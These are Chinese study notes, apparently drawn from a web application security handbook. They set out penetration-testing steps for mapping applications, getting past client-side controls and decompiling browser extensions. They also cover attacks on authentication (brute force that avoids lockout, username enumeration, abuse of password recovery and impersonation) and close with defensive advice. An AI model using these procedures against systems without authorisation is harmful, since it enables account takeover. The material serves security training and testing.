隔离独特的应用程序行为有时，许多可靠的应用程序会使用一致的框架来防范各种类型的攻击，此时薄弱点经常出现在开发人员后续添加的而常规安全框架没有处理的那些功能；一般来说，通过 GUI 外观、参数命名约定，或者源代码中的注释，即可找出这些拼接的功能； 渗透测试步骤 记录其使用的标准 GUI 外观、参数命名或导航机制与应用程序的其他部分不同的任何功能； 记录可能在后续添加的功能，包括调试功能、CAPTCHA 控件、使用情况跟踪和第三方代码等； 对这些区域进行全面检查，这些区域很可能没有其他区域实施的标准防御机制； 解析受攻击面常用的易受攻击的漏洞： 客户端确认：服务器没有采用确认检查； 数据库交互：SQL 注入； 文件上传与下载：路径遍历漏洞、保存型跨站点脚本； 显示用户提交的数据：跨站点脚本； 动态重定向：重定向与消息头注入攻击； 社交网络功能：用户名枚举、保存型跨站点脚本； 登录：用户名枚举、脆弱密码、可使用蛮力； 多阶段登录：登录缺陷； 会话状态：可推测出的令牌、令牌处理不安全； 访问控制：水平权限和垂直权限提升； 用户伪装功能：权限提升； 使用明文通信：会话劫持、收集证书和其他敏感数据； 站外链接：Referer 消息头中查询字符串参数泄露； 外部系统接口：处理会话与访问控制的快捷方式； 错误消息：令牌泄露； 电子邮件交互：电子邮件与命令注入； 本地代码组件或交互：缓冲区溢出； 使用第三方应用程序组件：已知漏洞； 已确认的Web 服务器软件：常见配置薄弱环节、已知软件程序缺陷； 解析 EIS 应用程序 了解应用程序的核心功能和使用的主要安全机制； 确定通常与常见漏洞有关的应用程序功能和行为特点； 在公共漏洞数据库（如 www.osvdb.org）中检查任何第三方代码，以确定任何已知问题； 制订攻击计划，优先考虑最可能包含漏洞的功能，以及最严重的漏洞； 小结虽然直接发动攻击显得很有吸引力，但在行动之前，先做一番分析的工作，将使得攻击的效率大大提高；一般来说，在采用手动技巧的同时，适当的采用自动化工具，是最有效的攻击手段； 5. 避开客户端控件通过客户端传送数据一般来说如果将会话数据放在服务器端，安全性更高一些，但是当在很多台服务器同时部署应用程序时，解决它们之间的数据同步将是一个挑战，因此有时候开发人员会将会话数据前移到客户端，这样确实让事情变得简单了，但是却增加了风险； 隐藏表单字段应用程序将部分信息保存在隐藏的表单字段中，之后和用户填写的其他表单字段一起提交； HTTP cookie应用程序将信息保存在 cookie 的键值对中，之后在客户端发起请求时，一起发到服务端； URL 参数将参数保存在 URL 中是最容易被用户修改的情况了； Referer 消息头有些开发者使用这个字段来判断某个请求是由哪个 URL 触发的； 模糊数据有时候服务端发到客户端的数据并不是明文的，而是经过了一定的模糊化处理，然后等客户端提交回服务端时，再解密去模糊； ASP.NET ViewState它是一种通过客户端传送模糊数据的常用机制，使用一些隐藏的字段保存一些序列化后的数据； 但是 ASP.NET 默认会开启对 ViewState 字段的保护，通过加盐进行散列化，用来防止客户端的窜改，但有些应用程序会将保护关掉，这个时候就会产生漏洞了；一个页面开启保护，不代表所有页面都开启，因此需要逐一排查； 收集用户数据：HTML 表单长度限制这个可以轻意绕过，只能用来限制非专业的用户；可以故意给相关的字段设置一个超过长度的值，然后看服务端是否有所反应，如果能够通过验证，则说明服务器端没有再做一次验证，存在漏洞； 基于脚本的确认跟前面的长度限制一样，略； 禁用的元素浏览器在提交请求时，并不会包含禁用的元素，因此仅仅观察发出的请求是无法找到这些元素的；但在查看页面源代码或者服务器的响应时，就会发现它们； 收集用户数据：浏览器扩展相对于 HTML 表单和 Javascript 脚本，使用浏览器扩展相对更不透明一些，这让开发人员有一种错觉，即扩展更加安全，但其实并非如此，通过检查扩展的漏洞经常可以收获很大； 常见的浏览器扩展技术 Java applet Flash Silverlight 它们有一些共同点，例如都编译成字节码、在提供沙盒环境的虚拟机中运行、可以使用远程框架，通过序列化来传输复杂的数据结构； 攻击浏览器扩展的方法 拦截并修改浏览器扩展提出的请求及服务器的响应； 直接针对组件实施攻击，并尝试反编译它的字节码，以查看它的源代码； 拦截浏览器扩展的流量如果扩展是明文传输数据，则简单好办，但有时候并非如此，以下是一些常见的问题： 处理序列化数据一般来说，每种浏览器扩展都会有一套序列化的方案，研究这些方案的特点，有针对性的进行解析处理； Java 序列化它会在在 Content-Type 里面体现为 application&#x2F;x-java-serialized-object, Burp Suite 中有一个插件 Dser 可用来查看拦截的序列化 Java 对象； Flash 序列化Content-Type: application&#x2F;x-amf Silverlight 序列化Content-Type: application&#x2F;soap+msbin1 拦截浏览器扩展流量时遇到的障碍问题1：扩展没有执行在浏览器中设置的代理原因在于客户端组件没有使用浏览器的 API 来发出 HTTP 请求，此时可以通过修改 hosts 文件来达到拦截目的，同时将代理服务器配置为劫持匿名代理，并自动重定向的正确的目标主机； 问题2：扩展可能不接受拦截代理器提供的 SSL 证书原因在于组件配置为不接受自签名的证书，或者组件本身的编码要求拒绝不可信的证书，此时可以通过在机器上面安装一个 CA 证书，并将代理服务器配置为使用该证书； 问题3：扩展使用除 HTTP 以外的协议进行通信原因在于拦截代理服务器可能无法处理这些协议；使用网络嗅探器例如 Echo Mirage 来修改相关流量，它通过注入进程并拦截套按字 API 调用来实现查看和修改数据的目的； 渗透测试步骤 确保代理服务器能够正确拦截浏览器扩展发出的所有流量；如有必要，使用嗅探器确定任何未正确拦截的流量； 如果扩展使用标准的序列化框架，确保拥有解压并修改序列化数据所需的工具；如果扩展使用专用编码或加密机制，则需要调试组件，对其进行全面测试； 检查服务器返回的能够触发客户端关键步骤的响应；一般来说，通过修改这个响应，能够解锁客户端的GUI，从而发现并执行那些复杂或多步骤的操作； 如果一些关键步骤（如赌博应用中的发牌动作）不是由客户端执行，而是由服务端执行，则尝试寻找执行该步骤和服务端通信之间的联系 反编译浏览器扩展在应对浏览器扩展时，对其进行反编译是最彻底的方法；一般来说，根据各自语言的特性，组件是以字节码的形式存在的，有时还会有反编码的防御机制，尽管如此，仍然是很有可能破解的； 下载字节码一般来说，字节码通过页面源文件中的 或 标签进行加载，里面有供下载的 URL；有时是通过脚本进行加载，此时可以等页面加载完毕后，再查看代理服务器的历史记录中的 URL； 由于字节码在加载后会被缓存，因为有时需要通过清理缓存来触发再次加载；另外拦截器有时会隐藏一些它认为不重要的信息，此时需要全部显示出来才找得到； 反编译字节码字节码经常以压缩包的形式被下载，因此需要先进行解压缩；Java 的 jar 包，Silverlight 的 .xap 文件，都是使用 zip 格式压缩的，此时只需给文件增加 zip 的后缀，即可以使用 zip 软件进行解压缩； 常用的反编译工具 Java：Jad Flash：Flasm，Flare，SWFScan； Silverlight：NET Reflector； 分析源代码重点分析的事项： 客户端输入确认或其他与安全相关的逻辑和事件； 在提交数据到服务端前，对数据进行加密或者模糊的函数； 在用户界面中看不到，但可以使用的隐藏功能； 在解析服务端时没发现，但在组件中引用的服务端功能； 修改组件行为的方法 修改源代码后，重新编译为字节码，清理缓存，重新下载字节码，之后用拦截器进行替换； 修改源代码后，重新编译为字节码，使用它计算出结果，导出到本地，用代理服务器将该结果提交到服务器； 使用 Javascript 操纵原始组件有时并不需要修改组件的字节码，而是基于组件的方法可能会被 javascript 调用，然后返回处理结果；此时，只需要修改 javascript 就可以实现修改结果的目的； 渗透测试步骤 下载、解压字节码，反编译成源代码； 查看源代码，了解组件的工作过程； 如果组件包含公共的方法，拦截与该组件交互的 HTML 响应，添加或修改 Javacript，获取想要的结果； 如果组件不包含公共的方法，修改组件的源代码，重新编译为字节码，独立执行这些字节码，获取想要的结果； 如果组件负责向服务端提交模糊或加密的数据，则可以设计一些特定的字符串，通过组件提交，用来探查服务端可能存在的漏洞； 字节码模糊处理为了应对反编译，人们会使用一些模糊技巧，让反编译后的结果难以被理解，或者增加理解的难度；常用的反编译技巧如下： 用没有意义的表达式替代有意义的类、方法、成员变量名称； 用保留的关键字替换项目名称； 删除字节码中不必要的调试和元信息，例如源文件名、行号、局部变量名、内部类信息； 增加多余的代码； 使用跳转指令对整个代码的执行路径进行修改，令人难以理解和判断执行代码的逻辑顺序； 在字节码中引入非法代码，如果不清除这些非法代码，则无法重新编译； 渗透测试步骤 不必完全理解源代码，只需确定是否包含公共方法，以及哪些方法可以从 javascript 进行调用，它们的签名是什么； 如果使用了无意义的表达式，则可以使用 IDE 内置的重构功能（如 rename），为其分配有意义的名称； 对已经模糊处理过的字节码，使用模糊处理工具，再次对其进行模糊处理，这样可以撤销许多模糊处理，例如 Jode 工具，它可用来删除由其他模糊处理工具添加的多余代码，并为数据分配唯一的名称，为理解模糊后的结果提供线索； 附加调试器有时组件很大，代码很多行，阅读它们很费时间，此时可考虑使用另外一种方法，即调试器；由于组件是在字节码级别运行的，因此用调试器在运行过程中跟踪变量，加入断点，查看和修改参数或变量，获取想要的结果，例如 javaSnoop； 本地客户端组件本地客户端组件不是基于字节码来运行，而是基于机器语言和汇编，因此它们的反编译工作稍微复杂一些（即逆向工程领域），不过原理仍然是一样的，即使用调试工具和添加断点，来分析程序的行为规律； 常用工具有：OllyDbg，IDA Pro等； 安全处理客户端数据通过客户端传送数据理论上，所有的数据服务端都是有的，因此，应该尽可能避免将敏感数据交给客户端提交，因为客户端是不可控的； 如果实在迫不得已，则应该将敏感数据和其他数据进行组合，然后加密，再发送到客户端，而不能仅单独加密敏感数据； 确认客户端生成的数据由于客户端被用户完全控制，因此在客户端对数据进行确认在理论上是几乎不可能的，只是难度大小的区别而已； 唯一安全的方法是永远不信任客户端，对客户端提交的每一项数据，都进行确认和验证； 日志与警报服务端有必要增加警报机制，在收到非法数据后，记录到日志中，向应用程序管理员发出警报，以便其能够监控攻击企图；同时应用程序还应该主动采取防御措施，终止用户会话或者暂时冻结其账户； 小结永远不要相信客户端的输入； 6. 攻击验证机制验证技术常用的验证技术 基于 HTML 表单的验证 多元机制，如密码+物理令牌； 客户端 SSL 证书或智能卡； HTTP 基本和摘要验证； 使用 NTLM 或 Kerberos 整合 Windows 验证； 第三方验证服务 验证机制设计缺陷密码保密性不强主要源于没有控制密码的强度；例如： 非常短或空白的密码； 以常用的字典词汇或名称为密码； 密码和用户名完全相同； 仍然使用默认密码； 渗透测试步骤 设法查明任何与密码强度有关的规则 浏览站点，查找规则的描述； 如果可以自行注册，用不同种类的脆弱密码注册一下，了解规则； 如果已经有账户，尝试把密码更改为弱密码； 蛮力攻击登录如果应用程序没有限制用户尝试的次数，则攻击者很容易就会使用蛮力攻击，因为有太多知名站点的沦陷，导致大量的用户密码泄露，它们都可以作为很好的密码库进行暴力尝试； 管理员密码经常更加脆弱，因为它常常是在应用程序上线之前就已经设置好的，因此经常没有遵守规则； 有些应用程序会在客户端使用隐藏字段记录尝试失败的次数，然后提交到服务器进行限制，但这种方法太容易被绕开；如果失败次数保留在服务端，也可以通过新开一个会话来绕过这个限制； 有些应用程序会在失败一定次数后锁定账户，让其不能登录，但是它可能仍然对后续的尝试做出正确与否的响应，此时攻击者只要不断尝试，直到找到正确的密码，然后等到解锁的时候，即可登录； 渗透测试步骤 用某个受控账户手动提交几个错误的登录尝试，监控接收到的错误消息； 如果在10次登录失败后，还没有返回锁定消息，再尝试正确的密码，如果登录成功，则说明应用程序并没有采取任何账户锁定策略； 如果账户被锁定，可以尝试使用不同的账户； 如果应用程序发布 cookie，则设置让每个 cookie 只使用一次，之后每次登录尝试获取新 cookie； 如果账户被锁定，应该查看与提交无效密码相比，提交正确密码是否会在响应中存在差异；如果是的话，则即使账户被锁定，仍然可以继续猜测攻击； 如果没有受控账户，尝试枚举一个有效的用户名，并使用它提交几次错误登录，监控账户的错误消息； 发动蛮力攻击前，应先确定好应用程序在成功与失败两种响应的差异，以便分清区别； 列出常见的用户名和密码列表，根据已知的密码规则对其进行过滤，只留下有效的密码，避免无谓的多余尝试； 使用这些用户名和密码的排列组合，使用适当的工具或定制脚本迅速生成登录请求，监控服务器的响应，筛选出那些成功的登录尝试； 如果一次针对几个用户名，最好使用广度优先，而不是深度优先，每个用户名只尝试一次密码，然后轮下一个用户名，这样避免触发单个用户名的失败次数过多的锁定； 详细的失败消息失败消息中，有时候会注明是哪一项登录消息无效，例如用户名或者密码，此时就可以利用这个信息，筛选出有效的用户名，供下一轮攻击时使用； 如果应用程序允许用户自行注册并指定自己的用户名，由于应用程序需要排查用户名是否重复，因此攻击者可以利用这一点进行用户名枚举，筛选出有效的用户名； 有些应用程序的登录比较复杂，需要用户提交几组信息，或者分几个步骤，此时详细的失败信息有助于攻击者轮流针对登录过程的每个阶段发动攻击； 同样的用户名错误，页面上可能看起来没有差别，但在 HTML 源代码中可能会有区别，通过“比较”工具找出区别，就可以收获有效的信息； 渗透测试步骤 如果已经有一个受控账户，使用这个账户的用户名和一个错误的密码登录一次，然后使用完全随机的用户名进行另一次登录； 记录两次登录服务器响应中的每一个细节，包括状态码、重定向、屏幕上显示的信息、页面源代码的差异；使用拦截器保存请求和响应的完整历史记录； 努力找出两次尝试间的任何明显或细微的差异； 如果找不到差异，在应用程序中任何提交用户名的地方重复上述操作，例如注册、密码修改、忘记密码等功能； 如果发现有差异，使用一个常见的用户名列表，用自动工具迅速提交每个用户名，根据响应的差异，筛选出有效的用户名； 开始枚举之前，确定应用程序是否有失败次数达到上限后的锁定策略；如果有，则不应该在枚举时使用不合理的密码，而应提交常见的密码； 即使服务端对有效用户名和无效用户名返回的响应完全相同，它的处理时间也经常是不同的，即有效用户名处理的步骤可能要久一些，而无效用户名要短一些；这种判断方法不一定百分百准确，但从大数来说，有一定的准确概率； 除了登录功能外，还可以从其他地方获取有效的用户名，例如源代码注释、开发人员的电子邮件、可访问的日志等； 密码传输易受攻击如果应用程序使用非加密的 HTTP 连接传输登录密码，处于网络中适当位置的窃听者就有机会能够拦截这些密码；可能窃听的位置有： 用户的本地网络中； 用户的 IT 部门中； 用户的 ISP 内； 因特网骨干网上； 托管应用程序的 ISP 内； 管理应用的 IT 部门内； 即使通过 HTTPS 登录，应用程序也有可能使用不安全的方式来处理密码，导致密码可能被泄露： 以查询字符串而不是 POST 请求主体中传送密码；这样会导致很多地方都会记录这些信息，例如用户的浏览历史记录、Web服务器日志内、主机基础架构使用的任何反向代理中；如果攻击者能够攻击这些资源，就有机会获得密码； 虽然多数应用开发者使用 POST 提交表单，但登录请求却经常使用 302 重定向到一个不同的 URL 来进行； 有些开发者会将密码保存在 cookie 中，此时攻击者可以通过访问客户端的本地文件系统来获得密码；即使密码被加密也没有关系，直接放入 cookie 中就可以用了； 有些应用程序在加载第一个页面时没有使用 HTTPS，而是等到了传输密码时，才使用 HTTPS，这样是有安全隐患的，即用户无法保证第一个加载到的页面是真实的； 渗透测试步骤 进行一次成功登录，监控客户端与服务器之间的所有来回流量； 确定在来回方向传输密码的每一种情况，可通过设置拦截规则，标记包含特殊字符串的信息； 如果发现客户端通过 URL 查询字符串或cookie提交密码，或者由服务端向客户端传输密码，则需要了解其这样做的目的； 查看是否通过非加密渠道传输任何敏感信息； 如果没有发现不安全传输密码的情况，留意任何明显或模糊处理的数据，如果这些数据中包括敏感数据，则可能逆向工程其模糊算法； 例如使用 HTTPS 提交密码，但使用 HTTP 加载登录表单，则有机会使用中间人攻击，通过钓鱼获取密码； 密码修改功能很多 Web 应用程序的密码修改功能经常不需要验证就可以访问，并经常给攻击者提供一些重要的信息，例如： 过于详细的错误消息，例如说明被请求的用户名是否有效； 允许攻击者无限制猜测现有密码字段； 在验证现有密码后，仅检查“新密码”与“确认新密码”字段的值是否相同，允许攻击者不需入侵即可成功确认现有密码是否正确； 渗透测试步骤 发现和确定应用程序中的所有密码修改功能；有时候它可能是隐藏的； 使用无效的用户名、无效的现有密码及不匹配的“新密码”和“确认新密码”等值，向密码修改功能提交各种请求； 设法确定任何可用于用户名枚举或蛮力攻击的行为； 提示：有时候表面看起来可能没有用户名字段，但它很可能是放在隐藏表单字段中；如果表单字段中也没有，可以尝试使用跟登录功能相同的参数提交一个包含用户名的参数（它有时可以成功覆盖当前用户的用户名，获得向其他用户发起蛮力攻击的机会，即使在主登录页面可能实施不了这个攻击）； 忘记密码功能同密码修改功能一样，忘记密码功能经常也会引入枚举漏洞，原因如下： 使用质询问题：通过社交网络或其他渠道，可能很容易获取这些质询的答案，它的答案范围比正常的密码范围要小得多； 没有为质询的回答次数进行限制； 使用密码暗示：由于普通用户缺少安全意识，留下的暗示经常相当于明示；另外还可以通过已存在的问题暗示库数据进行枚举破解； 通过质询后，告知旧密码；导致攻击者只要记下质询的答案，即使用户修改了密码后，仍然可以通过质询获得新密码； 通过质询后，跳转到一个无须验证的新会话，导致攻击者即使不知道密码，也马上可以使用该账户了； 通过质询后，将恢复的 URL 发送至质询过程中提供的邮箱，而不是早期注册时预留的邮箱；（有时候邮箱字段并不在界面上显示，而是放在一个隐藏的表单字段或cookie中）； 修改密码后没有给用户发通知，导致用户误以为自己修改了密码，然后重新设置密码，最终无法发现账户已经被攻破了； 渗透测试步骤 确认应用程序中的所有忘记密码功能；即使公布的页面中没有这个链接，但很可能仍然有这个功能； 使用受控账户执行一次完整的密码恢复流程，了解其工作机制； 如果恢复机制使用了质询，确定一下是否是让用户自行设定质询和响应，如果是的话，则可以使用质询库来进行匹配； 如果恢复机制使用暗示，使用已公开的暗示库，选择那些最容易猜测的暗示进行攻击； 尽量找出忘记密码机制中任何可用于用户名枚举或蛮力攻击的行为； 如果应用程序使用发送恢复 URL 的机制，则收集尽可能多的这类 URL ，然后找出规律，预测向其他用户发布 URL 的模式（可使用分析会话令牌相同的技巧）； “记住我”功能常见漏洞 在 cookie 中存放用户名，然后服务端简单相信该 cookie，没有进行验证； 在 cookie 中存放的会话标识没加密，此时可以通过推断其他用户的会话标识进行登录尝试； 在 cookie 中存放的会话标识有加密，此时可以尝试通过跨脚点脚本的漏洞获取这些标识； 渗透测试步骤 激活所有”记住我”功能，确定应用程序是否记住了用户名和密码，还是只记了用户名，之后仍然需要输入密码；如果是后者，则此功能可能没有太大的漏洞； 仔细检查 cookie 值以及其他在本地存储的数据，寻找其中可能标识出用户或明显包含可预测用户标识的数据； 即使其中保存的数据经过了加密或模糊处理，通过比较几个非常类似的用户或密码的结果，有可能可以找到逆向工程的机会； 尝试修改持久性 cookie 的值，让服务端认为有另外一名用户在客户端登录过； 用户伪装功能一些应用程序允许特权用户伪装成普通用户，然后以该用户的权限访问数据和执行操作，例如银行或电信客户，在获得用户的电话口头验证后，切换到用户账户权限进行操作；常见的设计缺陷如下： 伪装功能可能通过“隐藏”的形式执行，且不受常规访问控制的管理，只要猜出 URL 即可访问使用； 服务端可能会信任当前有效 cookie 提交的任何数据，并切换到伪装账户的权限进行操作； 如果管理员也可以被伪装，则任何缺陷都可能导致垂直权限提升的漏洞，导致攻击不仅可以访问其他用户的数据，还可以控制整个应用程序； 有些伪装功能能够以“后门”密码（或者叫万能密码）进行执行；攻击者可以在实施标准攻击的过程中，通过枚举发现这个密码 渗透测试步骤 确定应用程序中的所有伪装功能，即使公布的内容中没有明确的伪装功能链接； 尝试使用伪装功能伪装成其他用户； 设法操纵由伪装功能处理的用户提交的数据，尝试伪装成其他用户，特别留意任何不通过正常登录页面提交用户名的情况； 如果能够成功利用伪装功能，尝试伪装成任何已知的或猜测出的管理用户，以提交用户权限； 实施密码猜测攻击时，查看是否有用户使用多个有效密码，或者某个特殊的密码是否与几个用户名匹配；特别注意任何 “以 X 登录”的状态消息；用在蛮力攻击中获得的密码，以许多不同的用户登录，检查是否一切正常； 密码确认不完善应用程序对密码的要求会显著影响密码池的大小，攻击者通过对密码限制进行分析，可以删除密码库中不符合条件的密码，从而加快了枚举的速度； 渗透测试步骤 使用一个受控账户，尝试使用密码的各种变化形式进行登录，例如删除最后一个字符、改变字符大小写、删除任何特殊排版的字符，以了解完整的密码确认规则； 利用规则，调整自动攻击的配置，删除多余的密码，提高成功的效率； 非唯一性用户名非唯一性用户名还是比较少见的，可以通过多次使用同一用户名注册，来判断是否有唯一性的限制； 如果存在唯一性的限制，则可以通过大量注册常见的用户名，来获取哪些用户名是有人在用的； 渗透测试步骤 如果应用程序允许自我注册，尝试用不同密码两次注册同一个用户名； 如果应用程序不允许用户名重复，则可以用常见的用户名反复注册，以找到已注册的用户名； 如果应用程序允许用户名重复，尝试使用相同的密码，注册两个相同用户名，看应用程序会如何反应； 如果报错，使用某个有效的用户名，则尝试使用一组常用密码多次注册该用户名，如果应用程序拒绝某个特殊的密码，则可以发现用户名的现有密码； 如果没有报错，使用指定的密码登录，看看出现了什么结果；此时需要在每个账户中保存不同的数据以进行区分，之后才能确定这种行为是否可以导致跨账户的权限； 可预测的用户名有些应用程序根据某种可以预测的顺序自动生成账户用户名，在找到规律后，即可以很快获得全部的有效用户名； 可预测的初始密码一些应用程序一次性或大批量创建用户，并自动指定初始密码，然后分配给所有用户； 渗透测试步骤 设法获得几个连续的密码，看能否从中看出任何顺序规律； 如果有规律，根据规律，获取其他应用程序用户的密码； 如果密码看起来跟用户名关联，使用已知的用户名或猜测出的用户名，用推断出的密码尝试进行登录验证； 可以使用推断出的密码列表作为后续实施蛮力攻击的基础； 密码分配不安全由于人性懒惰，如果应用程序没有要求用户修改初始密码，则大部分用户都不会更改初始密码； 有些应用程序不分配密码，而是发送一个激活链接，用户点击后，开始设置初始密码；这个链接很可能存在某种规律，攻击者可以通过注册几个紧密相连的用户，来确定其中的规律； 有些应用程序更搞笑，在用户修改密码后，还会发一封邮件通知用户该新设置的密码是多少； 渗透测试步骤 获得一个新账户，如果应用程序没有要求在注册阶段设置密码，则需要弄清应用程序如何分配密码； 如果应用程序使用激活 URL，则尝试注册几个紧密相关的新账户，从中寻找 URL 存在的规律；找到规律后，尝试使用这些 URL 占领其他用户的账户； 尝试多次重复使用同一个激活 URL，看应用程序如何反应；如果被拒绝，则尝试输入多次的错误密码，将受控账户锁定，然后重复使用 URL，看是否可行； 验证机制执行缺陷故障开放登录机制当验证不通过时，服务端的处理可能存在缺陷，例如错误的用户密码仍然可以登录，只是没有完整的功能，这样会导致一些数据泄露； 渗透测试步骤 使用受控账户执行一次完整、有效的登录；使用拦截器记录提交的每一份数据，收到的每一个响应； 多次重复登录过程，以非常规方式修改提交的数据；包括：提交一个空字符串值、完全删除键值对、提交非常长和非常短的值、提交字符串代替数字或反过来、以相同和不同的值多次提高同一个数据项； 仔细检查服务器对每次畸形请求的响应，确定任何不同于基本情况的差异； 根据观察到的结果，调整测试过程；如果某个修改造成了行为的改变，设计将这个修改与其他修改进行组合，使应用程序的逻辑判断达到最大限度，以暴露其中可能存在的逻辑漏洞； 多阶段登录机制中的缺陷多阶段本意是想提高安全性，但是容易出现逻辑缺陷；开发人员经常会做出一些潜在的危险假设，包括： 应用程序认为访问第三阶段的用户已经完成了前两个阶段的认证； 应用程序可能会信任由第二阶段提交的数据，因为到达第二阶段表示通过了第一阶段的认证； 应用程序认为每个阶段的用户身份不变发生变化，因此并没有在每个阶段确认用户身份； 渗透测试步骤 使用一个受控账户执行一次完整的多步骤登录，用拦截器记录提交的每一份数据； 检查是否不止一次收到某条信息，或者是否有信息被返回给客户端，并通过隐藏表单字段、cookie或者预先设置的 URL 参数重新提交； 使用各种畸形请求多次重复登录过程：包括：尝试按不同的顺序完成登录步骤、尝试直接进入任何特定的阶段从那里继续登录、尝试省略每个阶段并从下一阶段继续登录、发挥想象力想出开发者无法预料的方式访问不同的阶段； 如果有数据不止提交一次，尝试在另外一个阶段提交一个不同的值，看是否能够成功登录；有些数据在某个阶段得到确认后，随后就被应用程序所信任；在这种情况下，可先用一个用户名通过第一阶段，再使用另一个用户名登录第二个阶段； 特别注意任何通过客户端传送，但不需要用户直接输入的数据，应用程序很有可能使用它们来保存登录的进度状态并且信任这些数据； 有些登录机制在用户名和密码验证后，会提出一个随机私密问题，要求用户进行回答；但有时候存在两个设计漏洞： 应用程序将问题细节放在隐藏字段中，而没有保留在服务器上，使得攻击者可以自动选择回答哪个问题； 应用程序没有记录用户回答错误的记录，因此攻击者有机会遍历所有问题，然后找一个可以回答的； 渗透测试步骤 如果应用程序使用了随机问题，检查问题本身是否和回答一起请求，如果是的话，尝试改变问题并提交正确答案，看能否成功登录； 如果应用程序不允许攻击者提交任意问题，则使用同一个账户反复进入这个问题，枚举所有存在的问题；有时应用程序会使用持久性的 cookie 让问题保持不变，此时只需要改变 cookie 即可以绕过限制； 不安全的密码存储应用程序常常以危险的方式将用户密码保存在数据库中，例如以明文存储；即使使用 MD5 或者 SHA-1 等算法进行散列处理，攻击者仍然可以在预先计算的散列值数据库查找观察到的散列；另外，由于应用程序使用的数据库账户需要随时读写这些密码，因此存在其他漏洞导致可以访问这些密码的风险； 渗透测试步骤 分析应用程序有所有与用户验证或维护有关的功能，如果发现服务端有返回用户的密码，则说明用户的密码是明文存储的，或者使用了某种可还原的加密形式保存密码； 如果发现应用程序中存在任意一种命令或执行查询的漏洞，则设法弄清楚应用程序将用户密码保存在数据库或文件系统中的什么位置；找到这些位置，弄清应用程序是否以非加密形式保存密码；如果以散列形式存储密码，则检查是否分配账户时常用或默认密码，以及未经过加盐处理的散列值；如果没有加盐，则可以查询在线散列数据库，以确定对应的明文密码值； 保障验证机制的安全不同的验证方案有不同的优缺点，在追求安全性的基础上，有时候需要牺牲功能、易用性和总成本等；因此，决策者需要在不同的方案和目标之间做好权衡，评估所付出的安全成本，是否能够被足够的收益所抵销； 使用可靠的密码 强制执行适应的最小密码强度要求，包括最小长度、使用字母+数字+特殊字符，同时使用大小写，避免使用单词、名称和常见密码，避免使用用户名为密码，避免使用和以前的密码相似或相同的密码； 应使用唯一的用户名； 系统生成的任何用户名和密码应具有足够的随机性，不包含任何顺序，以便攻击者无法进行预测； 允许用户设置足够强大的密码，例如增加长度和特殊字符； 安全处理密码 使用不会造成泄露的方式创建、保存和传送所有密码； 使用 SSL 保护客户端和服务端之间的通信； 在加载登录表单页面即使用 HTTPS ，而不是在提交登录信息时，才切换到 HTTPS； 只使用 POST 请求向服务器传输密码，绝不将密码放在 URL 或者 cookie 中；绝不将密码返回给客户端； 不将密码的原始值保存在数据库中，使用强大的散列函数加盐后保存，以便攻击者即使获得密码后也无法还原； 客户的“记住我”功能仅限于记住用户名，不可用于记住密码； 要求用户定期修改密码； 如果需要给用户分配密码，则应该以尽可能安全的方式传输密码，并设置时间限制，同时要求用户在第一次登录时更改密码，并告知用户在初次使用后销毁原始通信记录； 正确确认密码 应确认完整的密码，不过滤、截短或修改任何密码； 应用程序需要在登录处理过程中捕获所有异常并处理异常，出现异常后，应当删除用于控制登录状态的所有会话和相关数据，并使当前会话失效，以便让攻击者的会话强制退出； 严格审查验证逻辑的伪代码和源代码，避免其中存在任何的逻辑漏洞； 如果应用程序存在伪装功能，应该严格限制这种功能，防止攻击者利用它获得未授权的访问；该功能不得公开访问，仅限于内部访问；对访问方式进行严格审核和控制； 对阶段登录进行严格控制，防止攻击破坏各个阶段的转换与关系； 登录阶段的进度和上一阶段的结果应该只保存在服务端，绝不可以传送到客户端； 禁止用户多次提交一项登录信息； 禁止用户修改已经被收集或确认的数据；如果某个数据需要在各个阶段重复使用，应该保存在会话中进行引用； 每个登录阶段都应该先核实前面的阶段已经顺利完成，如果发现前面的阶段没有完成，应该将验证标记为恶意尝试； 为避免攻击者知悉是哪个阶段登录失败，即使用户无法完成前面的阶段，即使最初的用户名无效，应用程序也应该总是走完所有的登录阶段，之后再呈现登录失败的信息，同时不提供关于失败位置的任何信息； 如果在登录过程中需要回答一个随机的问题，需要确保攻击者无法选择问题； 如果已经向一个用户提出一个特定的问题，将该问题永久性的保存到用户资料中，确保每次该用户尝试登录时提出相同的问题，直到该用户正确回答了这个问题；（这种方式也是有漏洞，即攻击者可以利用这个机制来枚举有效的用户名，因为无效的用户名没有存储问题）； 如果向某个用户提出一个随机变化的质询，而问题应该保存在服务端，禁止保存到 HTML 的隐藏字段中，并根据保存的问题，核实用户提供的答案； 防止信息泄露 应用程序使用的各种验证机制不应泄露关于验证的参数信息，以便攻击者无法判断是哪项提交的数据出了问题； 使用一个统一的组件来负责响应所有的失败消息，确保失败消息总是呈现一致性，以避免攻击者利用不一致来获得信息； 如果应用程序使用账户锁定机制，则该机制可被利用来枚举有效的用户名； 如果应用程序支持自我注册，则该机制可被利用来枚举有效的用户名；因此应要求用户使用电子邮件进行注册，当用户注册后，发邮件到其邮箱，通知注册结果；如果用户已经注册过了，就在邮件中说明已注册，如果用户未注册，就在邮件中放上一个唯一的 URL 让用户继续完成余下的注册步骤； 阻止蛮力攻击 当用户失败超过一定次数后，可将账户冻结一定的时间，例如30分钟；这样做算是一个折中，避免非常规激活给用户增加太多的成本，也给攻击者增加成本； 应用程序不得透露任何关于存在冻结的信息，仅仅是提示有这种可能性即可； 应用程序不得透露冻结的时间； 如果账户被冻结，应用程序不再检查用户密码，直接拒绝登录尝试； 账户冻结措施不能万无一失，因为即使是5次的失败机会，也意味着攻击者有4次尝试不会引起锁定； 在需要验证的页面使用 CAPTCHA 质询，用来防止自动化的数据提交（不过现在也出现了很多破解 CAPTCHA 的工具，它只能用来提高攻击成本，吓退那些随意的攻击者）（有时候 CAPTCHA 的答案还会隐藏在表单字段中，使得攻击者不用解题即可以获得答案）； 防止滥用密码修改功能 应用程序必须设计密码修改功能，以便让用户定期修改密码； 只能从已经通过验证的会话中访问该功能； 不应以任何形式直接提供用户名，如隐藏的表单字段或者 cookie；企业修改他人密码的为定为非法行为； 要求用户修改密码时同时输入现有密码，以避免会话劫持漏洞、跨站点脚本攻击等； 为防止错误，新密码应该要求用户输入两次； 当尝试失败时，应使用常规错误消息告知错误，不能泄露错误的原因，如果出现多次失败，应临时冻结该功能； 应使用非常规的方式，通知用户密码已经修改，并且在通知中不得包含新密码或旧密码的信息； 防止滥用账户恢复功能 通过电子邮件向用户发送一条唯一的、有时间限制的、无法猜测的随机性 URL 帮助用户重新控制账户；当用户恢复账户后，再发送一封电子邮件通知用户密码已经修改；在用户的新密码修改成功前，旧密码应保持有效； 